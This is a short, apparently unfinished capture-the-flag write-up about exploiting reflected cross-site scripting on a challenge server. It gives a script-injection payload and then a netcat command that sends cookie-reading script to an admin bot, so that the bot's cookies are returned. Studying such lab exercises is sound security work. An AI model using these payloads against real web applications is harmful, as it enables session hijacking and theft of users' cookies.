# Under the Beamers

```
Clobbered or not clobbered, that's the question :)

See here: http://65.109.209.215:5000, the bot port is 4000!

Inspired by <https://sec-consult.com/vulnerability-lab/advisory/reflected-cross-site-scripting-xss-in-codebeamer-alm-solution-by-ptc/>, we can inject arbitrary script into the rendered HTML:

```
<html><script>alert("abc");</script></html>
```

Visit <http://65.109.209.215:5000/> and write the html above in the text area, and you will see the popup.

Then, we ask the bot to print out the cookie for us:

```shell
$ echo '<html><script>console.log(document.cookie);</script></html>' | nc 65.109.209.215 4000
==========
Tips: Every console.log usage on the bot will be sent back to you :)
